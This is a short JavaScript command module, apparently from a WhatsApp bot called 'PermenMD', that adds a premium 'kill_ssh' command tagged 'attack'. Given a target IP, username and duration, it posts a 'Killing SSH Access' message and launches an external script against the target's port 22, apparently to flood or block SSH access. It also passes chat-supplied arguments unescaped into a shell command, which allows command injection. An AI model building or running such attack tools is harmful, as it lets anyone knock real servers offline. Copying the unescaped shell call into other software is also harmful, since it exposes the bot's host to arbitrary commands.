const { exec } = require('child_process')


const handler = async (m, { args }) => {
    if (args.length < 3) {
        m.reply(`
\`\`\`[🔍] .kill_ssh [ip] [username] [duration]\`\`\``)
        return;
    }

    const hostname = args[0];
    const username = args[1];
    const duration = args[2];
    const port = '22';

conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `𝙿𝚎𝚛𝚖𝚎𝚗𝙼𝚒𝚜𝚌 𝚅4`,
body: `This Action Will Make A Deadly Move`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: global.attacking,
sourceUrl: ``
}}, text: `\`Killing SSH Access\`
\`Host:\` ${hostname}
\`Port:\` ${port}
\`User:\` ${username}
\`Duration:\` ${duration} Seconds
\`Creator:\` PermenMD`}, {quoted: m})
    exec(`node ./lib/PermenMD/StarsXSSH.js ${hostname} ${port} ${username} ${duration}`);
}

handler.help = ['kill_ssh']
handler.tags = [ 'attack'];
handler.premium = true
handler.command = /^(kill_ssh)$/i;
module.exports = handler